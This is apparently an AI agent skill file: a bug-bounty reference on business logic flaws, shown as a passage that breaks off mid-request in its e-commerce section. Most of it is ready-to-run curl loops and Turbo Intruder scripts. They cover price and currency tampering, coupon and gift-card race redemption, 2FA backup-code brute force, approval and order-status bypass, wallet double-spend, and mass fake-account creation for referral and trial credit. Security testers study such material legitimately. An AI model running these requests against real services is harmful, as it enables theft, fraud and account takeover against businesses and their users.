---
name: business-logic
description: Business logic vulnerability mastery - every technique for price manipulation, workflow bypass, coupon abuse, race conditions, state manipulation, and financial logic flaws
---

# Business Logic Vulnerability Master Reference

## 1. Fundamentals

Business logic vulnerabilities are flaws in the design and implementation of an application that allow an attacker to elicit unintended behavior. Unlike technical vulnerabilities (SQLi, XSS), these exploit flaws in the rules and workflows — the application does what it was coded to do, but not what it was intended to do.

### 1.1 Why Business Logic Pays

- **Scanners cannot find them** — they require understanding application intent
- **High impact** — financial loss, privilege escalation, account takeover
- **Common** — every complex app has at least one logic flaw
- **Hard to fix** — requires redesign, not a simple code patch
- **HackerOne 2025 data** — Business Logic Errors category paid $2.3M+ and rose 19% YoY

### 1.2 Core Principles

1. **Map every business flow** before testing
2. **Identify assumptions** — "the user will never send a negative quantity"
3. **Test each state transition** — what connects step N to step N+1?
4. **Think like an adversary** — what would cause financial loss or privilege gain?
5. **Chain everything** — a medium logic flaw + another medium = critical

## 2. Attack Surface Identification

### 2.1 Map Business Flows

For every feature, document the full state machine:

```
Registration:  Start → Form → Verify Email → Setup Profile → Welcome
Cart/Checkout: Add Item → Apply Coupon → Calculate Total → Payment → Confirm → Ship
Subscription:  Signup → Free Trial → Payment Method → Monthly → Cancel → Reactivate
Referrals:     Get Link → Share → Friend Signs Up → Friend Pays → Credit Applied
Password:      Request Reset → Email Link → Set New Password → Login
2FA:           Login → Password Correct → Request Code → Verify Code → Dashboard
Support:       Submit Ticket → Auto-Reply → Agent Assign → Resolve → Close
Account:       Personal Info → Plan → Billing → Team → Integrations → API Keys
```

For each flow, ask:
- What happens if I skip a step?
- What happens if I repeat a step?
- What happens if I reverse the order?
- What happens if I send invalid data at each transition?

### 2.2 Identify Assumptions

Developers make assumptions that become vulnerabilities:

| Assumption | Attack |
|-----------|--------|
| "Quantity will always be positive" | Negative quantity reverses price |
| "User will only use our UI" | Intercept and modify requests |
| "Price comes from our database" | Price sent from client is trusted |
| "Coupon can only be used once" | Race condition to use N times |
| "User clicks buttons in order" | Navigate directly to later steps |
| "2FA code verified correctly" | Skip 2FA by direct navigation |
| "Currency is always USD" | Change currency, keep amount |
| "Free trial once per user" | Multiple accounts, infinite trials |
| "Referrals are legitimate" | Self-referral, fake invites |

## 3. Price Manipulation

### 3.1 Negative Quantity

The most classic business logic flaw. If the cart accepts negative quantities, the total price can go negative or zero:

```bash
# Normal request
curl -X POST "https://target.com/api/cart/add" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": 123, "quantity": 1, "price": 100.00}'
# Total: $100.00

# Negative quantity attack
curl -X POST "https://target.com/api/cart/add" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": 456, "quantity": -1, "price": 200.00}'
# Total: $100.00 - $200.00 = -$100.00

# Or simply:
curl -X POST "https://target.com/api/cart/add" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": 123, "quantity": -99, "price": 100.00}'
# Total: $100 - ($100 * 99) = -$9800
```

Variations:
```bash
# Negative quantity in update endpoint
curl -X PATCH "https://target.com/api/cart/item/456" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"quantity": -5}'

# Negative quantity in bulk order
curl -X POST "https://target.com/api/orders/bulk" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"items": [{"id": 1, "qty": 5}, {"id": 2, "qty": -3, "price": 500}]}'

# Multiple items with one negative to cancel out positive
curl -X POST "https://target.com/api/cart/checkout" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"items": [{"product": "laptop", "qty": 1, "price": 999}, {"product": "coupon_discount", "qty": -1, "price": 999}]}'
```

### 3.2 Decimal Quantity

```bash
# Decimal quantity causing rounding errors
curl -X POST "https://target.com/api/cart/add" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": 123, "quantity": 0.5, "price": 100.00}'
# Total: $50.00 — but you get the same 0.5 item?

# Zero quantity
curl -X POST "https://target.com/api/cart/add" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": 123, "quantity": 0, "price": 100.00}'
# Total: $0 — receive product for free?

# Extreme decimal
curl -X POST "https://target.com/api/cart/add" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": 123, "quantity": 0.0001, "price": 100.00}'

# Very small quantity can cause floating point precision issues
curl -X POST "https://target.com/api/cart/add" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": 123, "quantity": 0.0000000001, "price": 999999.99}'
# May result in $0 due to scientific notation rounding
```

### 3.3 Integer Overflow / Underflow

```bash
# Very large quantity wraps to 0 or negative
curl -X POST "https://target.com/api/cart/add" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": 123, "quantity": 9999999999, "price": 100.00}'

# Very large price
curl -X POST "https://target.com/api/cart/add" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": 123, "quantity": 1, "price": 99999999999999999999}'

# Max int32: 2147483647
# Max int64: 9223372036854775807
# Exceeding these will overflow in many systems

# Negative overflow (if validation prevents negative but allows large negative via overflow)
curl -X POST "https://target.com/api/cart/add" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": 123, "quantity": -2147483648, "price": 100.00}'
# May overflow to positive if system uses unsigned int
```

### 3.4 Price Override

```bash
# Intercept checkout request and modify price directly
curl -X POST "https://target.com/api/checkout" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "items": [{"product_id": 1, "price": 0.01, "quantity": 1}],
    "total": 0.01,
    "currency": "USD"
  }'

# Price override in update request
curl -X PATCH "https://target.com/api/orders/12345" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "total": 0,
    "discount": 10000,
    "subtotal": 0
  }'

# Partial payment
curl -X POST "https://target.com/api/payments/confirm" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"order_id": 12345, "amount_paid": 0.01, "currency": "USD"}'

# Set price to negative to get money back
curl -X POST "https://target.com/api/orders/create" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"items": [{"id": 1, "price": -1000}], "total": -1000}'
# Server may issue a refund instead of charging
```

### 3.5 Currency Confusion

```bash
# Change currency from USD to cheaper currency
curl -X POST "https://target.com/api/checkout" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "items": [{"product_id": 1, "price": 99.99, "currency": "USD"}],
    "total": 99.99,
    "currency": "INR"
  }'
# $99.99 USD = $1.20 USD if interpreted as INR

# Try all currency codes
for currency in INR JPY IDR KRW VND ARS CLS IRR; do
  curl -X POST "https://target.com/api/checkout" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"items\":[{\"product_id\":1,\"price\":99.99}],\"total\":99.99,\"currency\":\"$currency\"}"
done

# Remove or empty currency
curl -X POST "https://target.com/api/checkout" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"items":[{"product_id":1,"price":99.99}],"total":99.99,"currency":""}'
curl -X POST "https://target.com/api/checkout" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"items":[{"product_id":1,"price":99.99}],"total":99.99}'
```

### 3.6 Formula Injection

When user input is directly concatenated into pricing calculations:

```bash
# If the server evaluates expressions like: total = quantity * price + discount
# Try injecting into the formula:
curl -X POST "https://target.com/api/cart/add" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": 1, "quantity": "1 * 0", "price": 100}'

# If discount field is a percentage string
curl -X POST "https://target.com/api/checkout" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code": "SPECIAL", "discount_percent": "100"}'
curl -X POST "https://target.com/api/checkout" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code": "SPECIAL", "discount_percent": "999"}'

# If discount is absolute
curl -X POST "https://target.com/api/checkout" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code": "SPECIAL", "discount_amount": 100000}'
```

### 3.7 Coupon/Discount Stacking

```bash
# Apply multiple coupons — test if they stack or replace
curl -X POST "https://target.com/api/coupon/apply" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"code": "SUMMER20"}'
# -20%

curl -X POST "https://target.com/api/coupon/apply" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"code": "WELCOME10"}'
# Does this replace SUMMER20 or stack?  -20% -10% = -30%?

curl -X POST "https://target.com/api/coupon/apply" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"code": "VIP50"}'
# Can you stack a third? -20% -10% -50% = -80%?

# Try applying same coupon twice
curl -X POST "https://target.com/api/coupon/apply" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"code": "WELCOME10"}'
curl -X POST "https://target.com/api/coupon/apply" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"code": "WELCOME10"}'
# First returns success. Second also returns success? -> double discount

# Coupon stacking in bulk API
curl -X POST "https://target.com/api/cart/apply-coupons" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"coupons": ["SUMMER20", "WELCOME10", "VIP50", "FREESHIP", "NEWUSER"]}'
```

### 3.8 Coupon Race Condition

The single highest-paying business logic bug pattern:

```bash
# 1. Get a single-use coupon code
curl -X POST "https://target.com/api/coupon/generate" \
  -H "Authorization: Bearer $TOKEN"
# {"code": "ONETIME-ABC123"}

# 2. Send 20 simultaneous redemption requests
# Using Turbo Intruder:
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           engine=Engine.BURP2)

    for i in range(20):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)

# curl-based parallel test
for i in $(seq 1 20); do
  curl -s -X POST "https://target.com/api/coupon/redeem" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"code":"ONETIME-ABC123"}' &
done
wait

# Check account balance after
curl -s "https://target.com/api/wallet/balance" -H "Authorization: Bearer $TOKEN"
# If discount/credit was applied more than once -> race condition confirmed
```

### 3.9 Personal/Birthday Coupon Abuse

```bash
# If coupons are sent for birthdays, test changing birthday
curl -X PATCH "https://target.com/api/users/me/profile" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"birthday": "2024-01-01"}'
# Check if you receive a birthday coupon
curl -s "https://target.com/api/notifications" -H "Authorization: Bearer $TOKEN"

# Change birthday to yesterday to trigger coupon generation
curl -X PATCH "https://target.com/api/users/me/profile" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"birthday": "2024-01-01"}'
# Receive coupon. Then:
curl -X PATCH "https://target.com/api/users/me/profile" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"birthday": "2024-01-02"}'
# Receive another coupon!
```

### 3.10 Expired Coupon Reuse

```bash
# Find expired coupon codes from:
# - Wayback machine: waybackurls target.com | grep -i coupon
# - JS files: grep -r "COUPON\|PROMO\|DISCOUNT" all_js.txt
# - Old emails
# - Source code comments

# Try them
curl -X POST "https://target.com/api/coupon/apply" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"code": "BLACKFRIDAY2020"}'

curl -X POST "https://target.com/api/coupon/apply" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"code": "SUMMER2019"}'

curl -X POST "https://target.com/api/coupon/apply" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"code": "LAUNCH2021"}'
```

### 3.11 Test Credit Cards

```bash
# Some payment systems accept test cards in production
# Common test cards:
# Visa: 4111111111111111
# Mastercard: 5555555555554444
# Amex: 378282246310005
# Discover: 6011111111111117
# Stripe test: 4242424242424242
# PayPal test: 4000000000000002 (declined - test failure handling)

curl -X POST "https://target.com/api/payments/charge" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "card_number": "4242424242424242",
    "expiry": "12/28",
    "cvv": "123",
    "amount": 99.99
  }'
```

## 4. Workflow Bypass

### 4.1 Multi-Step Workflow Skipping

```bash
# E-commerce flow: Cart → Shipping → Payment → Confirmation
# Skip directly to confirmation:
curl -s "https://target.com/api/orders/confirm/12345" \
  -H "Authorization: Bearer $TOKEN"
# If 200 -> order created without payment

# Cart -> Payment skip:
curl -s "https://target.com/api/orders/create" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"items": [{"id": 1, "qty": 1}], "skip_payment": true, "confirm": true}'

# Registration flow: Form → Email Verify → Setup → Dashboard
# Navigate directly to dashboard:
curl -s "https://target.com/api/dashboard" \
  -H "Authorization: Bearer $TOKEN"  # If session is partially created -> dashboard accessible

# Document signing: Upload → Sign → Verify → Complete
# Navigate directly to complete:
curl -X POST "https://target.com/api/documents/complete" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"document_id": 123}'
```

### 4.2 Approval Chain Bypass

```bash
# Multi-level approval: Submit → Manager Approve → Director Approve → Complete
# Submit as regular user:
curl -X POST "https://target.com/api/purchase-orders/submit" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"amount": 50000, "vendor": "evilcorp"}'

# Then try calling final approval directly:
curl -X POST "https://target.com/api/purchase-orders/approve-final" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"order_id": 123}'

# Or skip steps via status parameter:
curl -X PATCH "https://target.com/api/purchase-orders/123" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status": "fully_approved", "approval_level": "final"}'

# Set all approval flags at once
curl -X PATCH "https://target.com/api/purchase-orders/123" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "manager_approved": true,
    "director_approved": true, 
    "finance_approved": true,
    "ceo_approved": true,
    "status": "completed"
  }'
```

### 4.3 2FA Bypass

```bash
# After entering correct password, navigate directly to dashboard:
curl -s "https://target.com/api/dashboard" \
  -H "Authorization: Bearer $TOKEN"
# If the session is partially authenticated -> dashboard accessible

# Intercept 2FA verification response and modify:
# Original response:
{"mfa_required": true, "token": "verify_token", "status": "pending"}

# Modified response (via Burp intercept -> response modification is client-only):
# Actually this requires intercepting the response and running a script on the client
# More practical: send modified request expecting modified response:
curl -X POST "https://target.com/api/2fa/verify" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"code": "000000", "skip": true}'

# Try empty or null code
curl -X POST "https://target.com/api/2fa/verify" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{}'
curl -X POST "https://target.com/api/2fa/verify" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"code": null}'

# Reuse code across accounts
curl -X POST "https://target.com/api/2fa/verify" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"code": "123456", "user_id": "victim_id"}'

# Backup code brute force (often 6-8 digits, less rate limited)
for code in $(seq -w 00000000 00001000); do
  curl -s "https://target.com/api/2fa/verify-backup" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"code\": \"$code\"}" | grep -v "invalid" && echo "Found: $code"
done

# Wait... TOTP codes have time window - try same code window as your own
# Get your TOTP code, immediately send it to victim endpoint
YOUR_CODE=$(python3 -c "import pyotp; print(pyotp.TOTP('YOUR_SECRET').now())")
curl -X POST "https://target.com/api/2fa/verify" \
  -H "Authorization: Bearer $TOKEN_VICTIM" \
  -H "Content-Type: application/json" \
  -d "{\"code\": \"$YOUR_CODE\"}"
```

### 4.4 Account Merge / Pre-ATO

```bash
# Register same email via different OAuth providers
# This pattern has earned multiple critical bounties:
# Step 1: Register with Google (email: victim@gmail.com)
# Gets account A

# Step 2: Register with Facebook (email: victim@gmail.com)
# Gets account B

# Step 3: During merge flow, if not properly authenticated:
curl -X POST "https://target.com/api/accounts/merge" \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"merge_token": "facebook_account_token", "provider": "facebook"}'
# If merge accepts without re-authentication -> take over the merged account

# Unlink/re-link OAuth providers
curl -X POST "https://target.com/api/accounts/unlink" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"provider": "google"}'
# Can you then link someone else's Google account?

# Email takeover via account linking
curl -X POST "https://target.com/api/accounts/link-email" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email": "victim@target.com"}'
# Does this send a verification to victim@target.com OR just link it?
```

### 4.5 Subscription Downgrade/Upgrade Race

```bash
# Start trial of premium plan
curl -X POST "https://target.com/api/subscriptions/start-trial" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"plan": "premium", "trial_days": 30}'

# Simultaneously downgrade and upgrade
# Terminal 1: downgrade to free
curl -X PATCH "https://target.com/api/subscriptions/plan" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"plan": "free"}'

# Terminal 2: upgrade to enterprise (race with downgrade)
curl -X PATCH "https://target.com/api/subscriptions/plan" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"plan": "enterprise"}'
# If enterprise sticks without charging -> free upgrade

# Cancel then immediately reactivate
curl -X POST "https://target.com/api/subscriptions/cancel" \
  -H "Authorization: Bearer $TOKEN"
curl -X POST "https://target.com/api/subscriptions/reactivate" \
  -H "Authorization: Bearer $TOKEN"
# Does reactivation extend trial? Reset billing cycle?
```

## 5. Race Conditions

### 5.1 Double-Spend / Balance Manipulation

```bash
# Gift card redemption race
for i in $(seq 1 20); do
  curl -s -X POST "https://target.com/api/gift-card/redeem" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"code": "GIFT-ABCD-1234"}' &
done
wait

# Check balance after
curl -s "https://target.com/api/wallet/balance" -H "Authorization: Bearer $TOKEN"
# If balance increased by N x gift_card_value, race condition confirmed

# Credit transfer race
for i in $(seq 1 10); do
  curl -s -X POST "https://target.com/api/wallet/transfer" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"to": "attacker_id", "amount": 100}' &
done
wait

# Withdrawal race
for i in $(seq 1 10); do
  curl -s -X POST "https://target.com/api/wallet/withdraw" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"amount": 100, "method": "paypal"}' &
done
wait
```

### 5.2 Single-Packet Attack (HTTP/2 - Turbo Intruder)

```python
# Turbo Intruder - single-packet attack for HTTP/2
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    # Queue 30 identical requests
    for i in range(30):
        engine.queue(target.req, gate='race1')

    # Open gate — all requests sent in single TCP packet
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

### 5.3 Last-Byte Synchronization (HTTP/1.1)

```python
# Turbo Intruder - last-byte sync for HTTP/1.1
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           engine=Engine.THREADED)

    for i in range(30):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')
    engine.complete(timeout=60)
```

### 5.4 Multi-Endpoint Race Conditions

Sometimes payment validation and order confirmation happen in separate steps:

```bash
# Step 1: Add items to cart
curl -X POST "https://target.com/api/cart/add" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": 1, "quantity": 1, "price": 100}'

# Step 2: Add MORE items while payment is processing
# Send checkout AND add-to-cart simultaneously
for i in 1 2 3; do
  curl -s -X POST "https://target.com/api/cart/add" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"product_id": 1, "quantity": 1, "price": 100}' &
done
curl -s -X POST "https://target.com/api/checkout" \
  -H "Authorization: Bearer $TOKEN" &
wait

# Check if order includes items added DURING checkout
curl -s "https://target.com/api/orders/latest" -H "Authorization: Bearer $TOKEN"
```

### 5.5 Single-Endpoint Race Conditions

```bash
# Email change race — send two conflicting email changes
# In two terminals simultaneously:
curl -X PATCH "https://target.com/api/users/me/email" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@evil.com", "confirm": false}'

curl -X PATCH "https://target.com/api/users/me/email" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@evil2.com", "confirm": false}'

# If confirmation goes to wrong address or both pass -> critical

# Review/rating race
for i in $(seq 1 100); do
  curl -s -X POST "https://target.com/api/products/1/review" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"rating": 5, "title": "Great!"}' &
done
wait
# Check product rating - if >5 average, multiple reviews from same user
curl -s "https://target.com/api/products/1" | jq '.rating'
```

### 5.6 Deferred Race Conditions

Race windows that span minutes or hours:

```bash
# Step 1: Request email change to attacker@evil.com
curl -X PATCH "https://target.com/api/users/me/email" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@evil.com"}'

# Step 2: Wait 20 minutes (the confirmation link expires in 24h)
sleep 1200

# Step 3: Request another email change to attacker2@evil.com
curl -X PATCH "https://target.com/api/users/me/email" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker2@evil.com"}'

# Step 4: Check if first confirmation link still works
# If it does, the first email change wasn't invalidated -> both links active
```

### 5.7 Rate Limit Abuse for Race Windows

```bash
# Trigger server-side rate limit to delay processing,
# extending race window
for i in $(seq 1 100); do
  curl -s "https://target.com/api/search?q=test$i" \
    -H "Authorization: Bearer $TOKEN" &
done
wait

# NOW send the race condition requests while server is rate-limited
for i in $(seq 1 20); do
  curl -s -X POST "https://target.com/api/coupon/redeem" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"code": "SINGLE-USE-CODE"}' &
done
wait
```

## 6. State Manipulation

### 6.1 Order Status Manipulation

```bash
# Normal status flow: pending -> paid -> shipped -> delivered
# Can you skip statuses?

curl -X PATCH "https://target.com/api/orders/12345" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status": "shipped"}'

curl -X PATCH "https://target.com/api/orders/12345" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status": "delivered"}'

curl -X PATCH "https://target.com/api/orders/12345" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status": "refunded", "force_refund": true}'

# Try reverse status
curl -X PATCH "https://target.com/api/orders/12345" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status": "pending"}'
# Can you un-ship an order? Claim item was never received?
```

### 6.2 Account Status Manipulation

```bash
# Upgrade your own account
curl -X PATCH "https://target.com/api/users/me" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"plan": "enterprise", "billing_tier": "unlimited"}'

# Set account to premium
curl -X PATCH "https://target.com/api/users/me" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"is_premium": true, "subscription_status": "active", "trial_ends": null}'

# Extend trial forever
curl -X PATCH "https://target.com/api/users/me" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"trial_end": "2099-12-31", "in_trial": true}'

# Remove billing restrictions
curl -X PATCH "https://target.com/api/users/me" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"restrictions": [], "account_active": true}'
```

### 6.3 Free Trial Abuse

```bash
# Multiple free trials via disposable emails
for email in "user1@tempmail.com" "user2@tempmail.com" "user3@tempmail.com"; do
  curl -X POST "https://target.com/api/register" \
    -H "Content-Type: application/json" \
    -d "{\"email\": \"$email\", \"password\": \"Test123!\", \"plan\": \"premium\"}"
done

# Trial extension via card decline race
curl -X POST "https://target.com/api/subscriptions/start-trial" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"plan": "premium", "card": "4000000000000002"}'
# Card that always declines — does trial still start?

# Time manipulation
# If trial duration is client-controllable:
curl -X POST "https://target.com/api/subscriptions/start-trial" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"plan": "premium", "trial_days": 9999}'
```

### 6.4 Referral Abuse

```bash
# Self-referral
curl -X POST "https://target.com/api/referrals/claim" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"referral_code": "MY_OWN_CODE"}'

# Create fake referrals
for i in $(seq 1 100); do
  email="fake$i@tempmail.com"
  # Register fake account via API
  curl -X POST "https://target.com/api/register" \
    -H "Content-Type: application/json" \
    -d "{\"email\": \"$email\", \"password\": \"Test123!\", \"referral_code\": \"MY_CODE\"}"
done

# Check referral credits
curl -s "https://target.com/api/wallet/balance" -H "Authorization: Bearer $TOKEN"

# Multiple referral code claims at once
for i in $(seq 1 20); do
  curl -s -X POST "https://target.com/api/referrals/claim" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"referral_code\": \"CODE$i\"}" &
done
wait
```

### 6.5 Loyalty Points Abuse

```bash
# Points manipulation
curl -X PATCH "https://target.com/api/users/me/loyalty" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"points": 999999, "tier": "platinum"}'

# Points transfer race
for i in $(seq 1 20); do
  curl -s -X POST "https://target.com/api/loyalty/transfer" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"to": "attacker_id", "points": 10000}' &
done
wait
```

## 7. Testing Methodology

### 7.1 Step-by-Step

1. **Document every multi-step workflow**
   - Registration, checkout, password reset, 2FA, subscription, referral, export
   - For each, enumerate every state transition

2. **Test direct navigation to later steps**
   - After completing step 1, try accessing step 3 directly via URL
   - Try step 5 (final) directly without steps 2-4

3. **Test step replay**
   - Complete all steps, then replay step 2 — does it reset?
   - Complete payment, then replay payment — charged twice?

4. **Test parameter manipulation at each step**
   - Negative quantities, insane prices, wrong currency
   - Null values, empty arrays, type confusion
   - Force errored responses and check state

5. **Test race conditions on financial operations**
   - Coupon redemption, balance transfers, withdrawals
   - Send 20-30 simultaneous requests

6. **Test response manipulation**
   - Intercept and modify responses about 2FA, verification, approval
   - Does the client trust the server response without re-validation?

7. **Test edge cases**
   - Empty cart checkout
   - Zero-dollar orders
   - Orders with only negative items
   - Checkout with expired/invalid coupons
   - Multiple payment methods simultaneously

### 7.2 Quick Test Checklist

```bash
# Test every numeric input:
# - negative: -1, -99, -999999
# - zero: 0
# - decimal: 0.5, 0.001, 1.999
# - overflow: 2147483648, 99999999999
# - string: "one", "null", "undefined"
# - array: [1, 2, 3]
# - object: {"value": 1}

# Test every status/state field:
# - try all possible status values
# - try mixing states from different workflows
# - try setting completed/final states directly

# Test every flag/boolean:
# - true, false, null, "true", 1, 0
# - add fields that aren't in the UI spec

# Test every multi-step flow:
# - navigate directly to step N+2
# - repeat step N
# - reverse step order
# - submit step N data in step N+1 format

## 8. Domain-Specific Business Logic Flaws

### 8.1 E-Commerce

```bash
# Bundle/cart manipulation
curl -X POST "https://target.com/api/cart/add" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": 1, "quantity": 1, "price": 1000}'

# Add free item that should require purchase of other item
curl -X POST "https://target.com/api/cart/add" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": 2, "quantity": 1, "price": 0, "bundle_item": true}'
# Should require product_id 1 in cart, but does it check?

# Gift wrapping / add-ons (often free)
# Can you add unlimited free add-ons?
curl -X POST "https://target.com/api/cart/add" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": "gift_wrap", "quantity": 999, "price": 0}'

# Shipping cost manipulation
curl -X PATCH "https://target.com/api/orders/123/shipping" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"method": "express", "cost": 0.01}'

# Abusing price match / adjustments
curl -X POST "https://target.com/api/orders/123/price-match" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"competitor_url": "http://evil.com/cheaper", "price": 0.01}'

# Multiple shipping addresses (one paid, others free)
curl -X POST "https://target.com/api/orders/123" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "items": [{"id": 1, "ship_to": "victim_address"}],
